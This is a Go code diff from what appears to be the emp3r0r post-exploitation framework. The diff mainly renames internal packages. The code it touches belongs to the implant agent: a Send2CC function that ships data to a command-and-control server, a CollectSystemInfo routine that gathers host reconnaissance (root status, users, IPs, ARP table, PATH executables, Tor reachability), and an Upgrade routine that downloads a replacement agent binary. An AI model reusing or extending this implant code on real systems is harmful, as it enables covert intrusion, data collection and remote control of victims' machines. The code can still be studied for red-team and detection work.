@@ -15,9 +15,9 @@ import (
 	"strings"
 
 	"github.com/jaypipes/ghw"
-	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
-	"github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_crypto"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/internal/transport"
+	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -68,8 +68,8 @@ func IsAgentAlive(c net.Conn) bool {
 }
 
 // Send2CC send TunData to CC
-func Send2CC(data *emp3r0r_def.MsgTunData) error {
-	out := json.NewEncoder(emp3r0r_def.CCMsgConn)
+func Send2CC(data *def.MsgTunData) error {
+	out := json.NewEncoder(def.CCMsgConn)
 
 	err := out.Encode(data)
 	if err != nil {
@@ -79,9 +79,9 @@ func Send2CC(data *emp3r0r_def.MsgTunData) error {
 }
 
 // CollectSystemInfo build system info object
-func CollectSystemInfo() *emp3r0r_def.Emp3r0rAgent {
+func CollectSystemInfo() *def.Emp3r0rAgent {
 	log.Println("Collecting system info for checking in")
-	var info emp3r0r_def.Emp3r0rAgent
+	var info def.Emp3r0rAgent
 	osinfo := GetOSInfo()
 	info.GOOS = runtime.GOOS
 
@@ -106,7 +106,7 @@ func CollectSystemInfo() *emp3r0r_def.Emp3r0rAgent {
 	info.Tag = RuntimeConfig.AgentTag // use hostid
 	info.Hostname = hostname
 	info.Name = strings.Split(info.Tag, "-agent")[0]
-	info.Version = emp3r0r_def.Version
+	info.Version = def.Version
 	info.Kernel = osinfo.Kernel
 	info.Arch = osinfo.Architecture
 	info.CPU = util.GetCPUInfo()
@@ -115,7 +115,7 @@ func CollectSystemInfo() *emp3r0r_def.Emp3r0rAgent {
 	info.Hardware = util.CheckProduct(info.Product)
 	info.Container = CheckContainer()
 	setC2Transport()
-	info.Transport = emp3r0r_def.Transport
+	info.Transport = def.Transport
 
 	// have root?
 	info.HasRoot = HasRoot()
@@ -132,11 +132,11 @@ func CollectSystemInfo() *emp3r0r_def.Emp3r0rAgent {
 	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)
 
 	// is cc on tor?
-	info.HasTor = tun.IsTor(emp3r0r_def.CCAddress)
+	info.HasTor = transport.IsTor(def.CCAddress)
 
 	// has internet?
 	if RuntimeConfig.EnableNCSI {
-		info.HasInternet = tun.TestConnectivity(tun.UbuntuConnectivityURL, RuntimeConfig.C2TransportProxy)
+		info.HasInternet = transport.TestConnectivity(transport.UbuntuConnectivityURL, RuntimeConfig.C2TransportProxy)
 		info.NCSIEnabled = true
 	} else {
 		info.HasInternet = false
@@ -144,10 +144,10 @@ func CollectSystemInfo() *emp3r0r_def.Emp3r0rAgent {
 	}
 
 	// IP address?
-	info.IPs = tun.IPa()
+	info.IPs = transport.IPa()
 
 	// arp -a ?
-	info.ARP = tun.IPNeigh()
+	info.ARP = transport.IPNeigh()
 
 	// exes in PATH
 	info.Exes = util.ScanPATH()
@@ -162,7 +162,7 @@ func Upgrade(checksum string) (out string) {
 	if err != nil {
 		return fmt.Sprintf("Error: Download agent: %v", err)
 	}
-	download_checksum := emp3r0r_crypto.SHA256SumFile(tempfile)
+	download_checksum := crypto.SHA256SumFile(tempfile)
 	if checksum != download_checksum {
 		return fmt.Sprintf("Error: checksum mismatch: %s expected, got %s", checksum, download_checksum)
 	}
